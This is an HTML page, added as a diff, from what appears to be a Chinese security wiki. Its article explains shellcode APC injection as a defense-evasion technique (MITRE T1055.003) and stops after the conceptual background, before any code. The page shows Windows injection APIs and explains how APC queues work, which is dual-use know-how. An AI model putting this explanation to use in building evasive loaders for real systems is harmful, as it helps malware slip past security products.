@@ -1,0 +1,705 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    
+    <title>Shellcode APC注入和加载 | Tahir&#39;s Wiki</title>
+    
+    
+        <meta name="keywords" content="Defense Evasion">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="Metadata   Author Tahir    Creation Date 2021&#x2F;08&#x2F;02   Modification Date 2021&#x2F;08&#x2F;02   Tactics TA0005   Techniques T1055.003   TacticsDefense Evasion TechniquesShellcode APC注入和加载一般的shellcode加载器，流程为调用vir">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Shellcode APC注入和加载">
+<meta property="og:url" content="http://example.com/wiki/5.%20%E9%AB%98%E7%BA%A7%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Defense%20Evasion/%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/Shellcode-APC%E6%B3%A8%E5%85%A5%E5%92%8C%E5%8A%A0%E8%BD%BD/index.html">
+<meta property="og:site_name" content="Tahir&#39;s Wiki">
+<meta property="og:description" content="Metadata   Author Tahir    Creation Date 2021&#x2F;08&#x2F;02   Modification Date 2021&#x2F;08&#x2F;02   Tactics TA0005   Techniques T1055.003   TacticsDefense Evasion TechniquesShellcode APC注入和加载一般的shellcode加载器，流程为调用vir">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/wiki/5.%20%E9%AB%98%E7%BA%A7%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Defense%20Evasion/%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/Shellcode-APC%E6%B3%A8%E5%85%A5%E5%92%8C%E5%8A%A0%E8%BD%BD/1.png">
+<meta property="og:image" content="http://example.com/wiki/5.%20%E9%AB%98%E7%BA%A7%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Defense%20Evasion/%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/Shellcode-APC%E6%B3%A8%E5%85%A5%E5%92%8C%E5%8A%A0%E8%BD%BD/3.png">
+<meta property="og:image" content="http://example.com/wiki/5.%20%E9%AB%98%E7%BA%A7%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Defense%20Evasion/%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/Shellcode-APC%E6%B3%A8%E5%85%A5%E5%92%8C%E5%8A%A0%E8%BD%BD/2.png">
+<meta property="article:published_time" content="2021-08-02T03:14:34.000Z">
+<meta property="article:modified_time" content="2021-08-04T03:40:40.250Z">
+<meta property="article:author" content="Tahir">
+<meta property="article:tag" content="Defense Evasion">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/wiki/5.%20%E9%AB%98%E7%BA%A7%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Defense%20Evasion/%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/Shellcode-APC%E6%B3%A8%E5%85%A5%E5%92%8C%E5%8A%A0%E8%BD%BD/1.png">
+    
+
+    
+        <link rel="alternate" href="/atom.xml" title="Tahir&#39;s Wiki" type="application/atom+xml">
+    
+
+    
+        <link rel="icon" href="/favicon.ico">
+    
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/libs/open-sans/styles.css">
+
+    
+<link rel="stylesheet" href="/libs/source-code-pro/styles.css">
+
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<script src="/libs/jquery/2.1.3/jquery.min.js"></script>
+
+    
+<script src="/libs/jquery/plugins/cookie/1.4.1/jquery.cookie.js"></script>
+
+    
+    
+        
+<link rel="stylesheet" href="/libs/lightgallery/css/lightgallery.min.css">
+
+    
+    
+        
+<link rel="stylesheet" href="/libs/justified-gallery/justifiedGallery.min.css">
+
+    
+    
+    
+    
+
+
+    
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+    <div id="container">
+        <header id="header">
+    <div id="header-main" class="header-inner">
+        <div class="outer">
+            <a href="/" id="logo">
+                <i class="logo"></i>
+                <span class="site-title">Tahir&#39;s Wiki</span>
+            </a>
+            <nav id="main-nav">
+                
+                    <a class="main-nav-link" href="/">首页</a>
+                
+                    <a class="main-nav-link" href="/archives">归档</a>
+                
+                    <a class="main-nav-link" href="/categories">分类</a>
+                
+                    <a class="main-nav-link" href="/tags">标签</a>
+                
+                    <a class="main-nav-link" href="/about">关于</a>
+                
+            </nav>
+            
+            <div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="Search">
+        <button type="submit" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="Type something...">
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+</div>
+        </div>
+    </div>
+    <div id="main-nav-mobile" class="header-sub header-inner">
+        <table class="menu outer">
+            <tr>
+                
+                    <td><a class="main-nav-link" href="/">首页</a></td>
+                
+                    <td><a class="main-nav-link" href="/archives">归档</a></td>
+                
+                    <td><a class="main-nav-link" href="/categories">分类</a></td>
+                
+                    <td><a class="main-nav-link" href="/tags">标签</a></td>
+                
+                    <td><a class="main-nav-link" href="/about">关于</a></td>
+                
+                <td>
+                    
+    <div class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="Search">
+    </div>
+
+                </td>
+            </tr>
+        </table>
+    </div>
+</header>
+
+        <div class="outer">
+            
+            
+                <aside id="sidebar">
+   
+        
+    <div class="widget-wrap" id="categories">
+        <h3 class="widget-title">
+            <span>categories</span>
+            &nbsp;
+            <a id="allExpand" href="#">
+                <i class="fa fa-angle-double-down fa-2x"></i>
+            </a>
+        </h3>
+        
+        
+        
+         <ul class="unstyled" id="tree"> 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            1. 漏洞相关
+                        </a>
+                         <ul class="unstyled" id="tree"> 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            MSSQL
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/MSSQL/CVE-2020-0618-Microsoft-SQL-Server-Reporting-Services%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">CVE-2020-0618_SQL Server Reporting Services远程代码执行漏洞</a></li>  <li class="file"><a href="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/MSSQL/BID-23649-Microsoft-SQL-Server-%E6%95%B0%E6%8D%AE%E5%BA%93%E9%93%BE%E6%8E%A5%E7%88%AC%E7%BD%91%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">BID-23649_SQL Server链接爬网命令执行漏洞</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            OpenSSL
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/OpenSSL/CVE-2014-0224-OpenSSL%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%BC%8F%E6%B4%9E/">CVE-2014-0224_OpenSSL中间人漏洞</a></li>  <li class="file"><a href="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/OpenSSL/CVE-2014-0160-OpenSSL%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E/">CVE-2014-0160_OpenSSL心脏滴血漏洞</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            Redis
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/">Redis未授权访问漏洞</a></li>  <li class="file"><a href="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">Redis主从复制代码执行漏洞</a></li>  <li class="file"><a href="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2013-7458-Redis-redis-cli%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/">CVE-2013-7458_Redis redis-cli信息泄露漏洞</a></li>  <li class="file"><a href="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/">CVE-2015-4335_Redis EVAL Lua沙箱绕过漏洞</a></li>  <li class="file"><a href="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-8080-Redis-getnum%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/">CVE-2015-8080_Redis getnum整数溢出漏洞</a></li>  <li class="file"><a href="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-8339-Redis%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/">CVE-2016-8339_Redis缓冲区溢出漏洞</a></li>  <li class="file"><a href="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-10517-Redis%E8%B7%A8%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/">CVE-2016-10517_Redis跨协议漏洞</a></li>  <li class="file"><a href="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2017-15047-Redis%E6%95%B0%E7%BB%84%E7%B4%A2%E5%BC%95%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E/">CVE-2017-15047_Redis数组索引越界漏洞</a></li>  <li class="file"><a href="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2018-11218-Redis-Lua%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/">CVE-2018-11218_Redis Lua缓冲区溢出漏洞</a></li>  </ul> 
+                    </li> 
+                     </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            2. 数据库安全
+                        </a>
+                         <ul class="unstyled" id="tree"> 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            Oracle Database
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database%E7%AE%80%E5%8D%95%E6%A6%82%E8%BF%B0/">Oracle Database简单概述</a></li>  <li class="file"><a href="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database-PLSQL%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86/">Oracle Database PL/SQL注入漏洞原理</a></li>  <li class="file"><a href="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database-11g-Wrap%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/">Oracle Database 11g Wrap加密解密分析</a></li>  <li class="file"><a href="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-%E4%B8%8A%E7%AF%87/">The Oracle Hacker's Handbook: Hacking and Defending Oracle 上篇</a></li>  <li class="file"><a href="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-%E4%B8%8B%E7%AF%87/">The Oracle Hacker's Handbook: Hacking and Defending Oracle 下篇</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            SQL Server
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/">SQL Server数据库攻防详解上篇</a></li>  <li class="file"><a href="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/">SQL Server数据库攻防详解下篇</a></li>  <li class="file"><a href="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/">SQL Server数据库安全加固</a></li>  </ul> 
+                    </li> 
+                     </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            3. 应急响应
+                        </a>
+                         <ul class="unstyled" id="tree"> 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            Linux应急响应
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/3.%20%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">Linux应急响应</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            Windows应急响应
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/3.%20%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/Windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/Windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">Windows应急响应</a></li>  </ul> 
+                    </li> 
+                     </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            4. 内网安全攻防
+                        </a>
+                         <ul class="unstyled" id="tree"> 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            0-内网攻防基础
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/0-%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/PowerShell%E5%9F%BA%E7%A1%80/">PowerShell基础</a></li>  <li class="file"><a href="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/0-%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/%E9%83%A8%E7%BD%B2%E5%9F%9F%E7%8E%AF%E5%A2%83/">部署域环境</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            1-内网信息搜集
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/1-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/">主机信息搜集</a></li>  <li class="file"><a href="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/1-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/">域信息搜集</a></li>  </ul> 
+                    </li> 
+                     </ul> 
+                    </li> 
+                    
+                    <li class="directory open">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder-open"></i>
+                            &nbsp;
+                            5. 高级威胁猎捕
+                        </a>
+                         <ul class="unstyled" id="tree"> 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            Cobalt Strike
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/5.%20%E9%AB%98%E7%BA%A7%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/0-Cobalt%20Strike%E9%9B%B6%E5%9F%BA%E7%A1%80/">0-Cobalt Strike零基础</a></li>  <li class="file"><a href="/wiki/5.%20%E9%AB%98%E7%BA%A7%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/">1-Cobalt Strike基础上篇</a></li>  <li class="file"><a href="/wiki/5.%20%E9%AB%98%E7%BA%A7%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/">1-Cobalt Strike基础中篇</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory open">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder-open"></i>
+                            &nbsp;
+                            Defense Evasion
+                        </a>
+                         <ul class="unstyled" id="tree"> 
+                    <li class="directory open">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder-open"></i>
+                            &nbsp;
+                            进程注入
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file active"><a href="/wiki/5.%20%E9%AB%98%E7%BA%A7%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Defense%20Evasion/%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/Shellcode-APC%E6%B3%A8%E5%85%A5%E5%92%8C%E5%8A%A0%E8%BD%BD/">Shellcode APC注入和加载</a></li>  </ul> 
+                    </li> 
+                     </ul> 
+                    </li> 
+                     </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            6. 威胁情报
+                        </a>
+                         <ul class="unstyled" id="tree"> 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            APT情报
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/6.%20%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/APT%E6%83%85%E6%8A%A5/%E7%9F%A5%E5%90%8DAPT%E7%BB%84%E7%BB%87%E6%A6%82%E8%BF%B0/">知名APT组织概述</a></li>  </ul> 
+                    </li> 
+                     </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            7. 学习资源
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/7.%20%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%BA%90/%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%BA%90/">学习资源</a></li>  </ul> 
+                    </li> 
+                     <li class="file"><a href="/wiki/hello-world/">Hello World</a></li>  </ul> 
+    </div>
+    <script>
+        $(document).ready(function() {
+            var iconFolderOpenClass  = 'fa-folder-open';
+            var iconFolderCloseClass = 'fa-folder';
+            var iconAllExpandClass = 'fa-angle-double-down';
+            var iconAllPackClass = 'fa-angle-double-up';
+            // Handle directory-tree expansion:
+            // 左键单独展开目录
+            $(document).on('click', '#categories a[data-role="directory"]', function (event) {
+                event.preventDefault();
+
+                var icon = $(this).children('.fa');
+                var expanded = icon.hasClass(iconFolderOpenClass);
+                var subtree = $(this).siblings('ul');
+                icon.removeClass(iconFolderOpenClass).removeClass(iconFolderCloseClass);
+                if (expanded) {
+                    if (typeof subtree != 'undefined') {
+                        subtree.slideUp({ duration: 100 });
+                    }
+                    icon.addClass(iconFolderCloseClass);
+                } else {
+                    if (typeof subtree != 'undefined') {
+                        subtree.slideDown({ duration: 100 });
+                    }
+                    icon.addClass(iconFolderOpenClass);
+                }
+            });
+            // 右键展开下属所有目录
+            $('#categories a[data-role="directory"]').bind("contextmenu", function(event){
+                event.preventDefault();
+                
+                var icon = $(this).children('.fa');
+                var expanded = icon.hasClass(iconFolderOpenClass);
+                var listNode = $(this).siblings('ul');
+                var subtrees = $.merge(listNode.find('li ul'), listNode);
+                var icons = $.merge(listNode.find('.fa'), icon);
+                icons.removeClass(iconFolderOpenClass).removeClass(iconFolderCloseClass);
+                if(expanded) {
+                    subtrees.slideUp({ duration: 100 });
+                    icons.addClass(iconFolderCloseClass);
+                } else {
+                    subtrees.slideDown({ duration: 100 });
+                    icons.addClass(iconFolderOpenClass);
+                }
+            })
+            // 展开关闭所有目录按钮
+            $(document).on('click', '#allExpand', function (event) {
+                event.preventDefault();
+                
+                var icon = $(this).children('.fa');
+                var expanded = icon.hasClass(iconAllExpandClass);
+                icon.removeClass(iconAllExpandClass).removeClass(iconAllPackClass);
+                if(expanded) {
+                    $('#sidebar .fa.fa-folder').removeClass('fa-folder').addClass('fa-folder-open')
+                    $('#categories li ul').slideDown({ duration: 100 });
+                    icon.addClass(iconAllPackClass);
+                } else {
+                    $('#sidebar .fa.fa-folder-open').removeClass('fa-folder-open').addClass('fa-folder')
+                    $('#categories li ul').slideUp({ duration: 100 });
+                    icon.addClass(iconAllExpandClass);
+                }
+            });  
+        });
+    </script>
+
+    
+    <div id="toTop" class="fa fa-angle-up"></div>
+</aside>
+            
+            <section id="main"><article id="post-5. 高级威胁猎捕/Defense Evasion/进程注入/Shellcode-APC注入和加载" class="article article-type-post" itemscope itemprop="blogPost">
+    <div class="article-inner">
+        
+        
+            <header class="article-header">
+                
+                    <div class="article-meta">
+                        
+    <div class="article-category">
+    	<i class="fa fa-folder"></i>
+        <a class="article-category-link" href="/categories/5-%E9%AB%98%E7%BA%A7%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/">5. 高级威胁猎捕</a><i class="fa fa-angle-right"></i><a class="article-category-link" href="/categories/5-%E9%AB%98%E7%BA%A7%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Defense-Evasion/">Defense Evasion</a><i class="fa fa-angle-right"></i><a class="article-category-link" href="/categories/5-%E9%AB%98%E7%BA%A7%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Defense-Evasion/%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/">进程注入</a>
+    </div>
+
+                        
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link-link" href="/tags/Defense-Evasion/" rel="tag">Defense Evasion</a>
+    </div>
+
+                        
+    <div class="article-date">
+        <i class="fa fa-calendar"></i>
+        <a href="/wiki/5.%20%E9%AB%98%E7%BA%A7%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Defense%20Evasion/%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/Shellcode-APC%E6%B3%A8%E5%85%A5%E5%92%8C%E5%8A%A0%E8%BD%BD/">
+            <time datetime="2021-08-02T03:14:34.000Z" itemprop="datePublished">2021-08-02</time>
+        </a>
+    </div>
+
+
+                        
+                            <i class="fa fa-bar-chart"></i>
+                            <span id="busuanzi_container_site_pv"><span id="busuanzi_value_page_pv"></span></span>    
+                        
+                        
+                            <div class="article-meta-button">
+                                <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/TahirMars/Wiki-site/raw/writing/source/_posts/5. 高级威胁猎捕/Defense Evasion/进程注入/Shellcode-APC注入和加载.md"> Source </a>
+                            </div>
+                            <div class="article-meta-button">
+                                <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/TahirMars/Wiki-site/edit/writing/source/_posts/5. 高级威胁猎捕/Defense Evasion/进程注入/Shellcode-APC注入和加载.md"> Edit </a>
+                            </div>
+                            <div class="article-meta-button">
+                                <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/TahirMars/Wiki-site/commits/writing/source/_posts/5. 高级威胁猎捕/Defense Evasion/进程注入/Shellcode-APC注入和加载.md"> History </a>
+                            </div>
+                        
+                    </div>
+                
+                
+    
+        <h1 class="article-title" itemprop="name">
+            Shellcode APC注入和加载
+        </h1>
+    
+
+            </header>
+        
+        
+        <div class="article-entry" itemprop="articleBody">
+        
+        
+            
+        
+        
+            <h2 id="Metadata"><a href="#Metadata" class="headerlink" title="Metadata"></a>Metadata</h2><table>
+<thead>
+<tr>
+<th>Author</th>
+<th>Tahir</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Creation Date</td>
+<td>2021/08/02</td>
+</tr>
+<tr>
+<td>Modification Date</td>
+<td>2021/08/02</td>
+</tr>
+<tr>
+<td>Tactics</td>
+<td><a target="_blank" rel="external nofollow noopener noreferrer" href="https://attack.mitre.org/tactics/TA0005/">TA0005</a></td>
+</tr>
+<tr>
+<td>Techniques</td>
+<td><a target="_blank" rel="external nofollow noopener noreferrer" href="https://attack.mitre.org/techniques/T1055/003/">T1055.003</a></td>
+</tr>
+</tbody></table>
+<h2 id="Tactics"><a href="#Tactics" class="headerlink" title="Tactics"></a>Tactics</h2><p>Defense Evasion</p>
+<h2 id="Techniques"><a href="#Techniques" class="headerlink" title="Techniques"></a>Techniques</h2><h3 id="Shellcode-APC注入和加载"><a href="#Shellcode-APC注入和加载" class="headerlink" title="Shellcode APC注入和加载"></a>Shellcode APC注入和加载</h3><p>一般的shellcode加载器，流程为调用virtualAlloc分配空间、复制shellcode、执行shellcode，所有操作都在加载器的内存空间，隐蔽性不强，容易被发现。如果利用其他进程的内存空间，进行shellcode注入和加载执行，可以进行防御规避。</p>
+<p>Shellcode远程线程注入，一般是利用CreateRemoteThread<code>，</code>SuspendThread<code>/ </code>SetThreadContext<code>/ </code>ResumeThread，和那些可用于另一过程中修改存储器，诸如VirtualAllocEx/ WriteProcessMemory：在目标进程创建一个线程，把shellcode复制到目标进程后执行。但是这些API，已经能被各大厂商进行检测拦截，所以，介绍另一种远程Shellcode注入的方式——APC注入。</p>
+<h4 id="APC（异步过程调用）"><a href="#APC（异步过程调用）" class="headerlink" title="APC（异步过程调用）"></a>APC（异步过程调用）</h4><p><strong>APC（异步过程调用）：</strong></p>
+<p>线程在执行的时候如果自身不主动跳转去其他地方，就会一直占有CPU。所以通过APC机制，在线程执行的期间，定时检查是否存在其他需要执行的代码。</p>
+<p>Windows APC函数是被按照先进先出（FIFO）顺序放置在一个队列Queue上面的。同时，用户APC函数极为特别，它只有在线程处于“alertable的线程等待状态”时才能被线程调用。但是，线程一旦开始调用APC函数，就会一次性将所有APC队列上的函数全部执行完毕。通过这种方式可以让ring3的死循环线程不会一直占用CPU，使得别的线程可以执行。</p>
+<p>alertable状态代表线程暂时无重要的事情要做。APC函数不会去干预（中断）线程的运行。一个线程，有两个APC队列，分别为用户APC和系统APC。用户模式下，可以调用函数SleepEx、SignalObjectAndWait、WaitForSingleObjectEx、WaitForMultipleObjectsEx、MsgWaitForMultipleObjectsEx都可以使目标线程处于alertable等待状态，从而<strong>让用户模式APCs执行</strong>。</p>
+<p><strong>APC（异步过程调用）作用：</strong></p>
+<p>1、APCs允许用户程序和系统元件在一个进程的地址空间内某个线程的上下文中执行代码。</p>
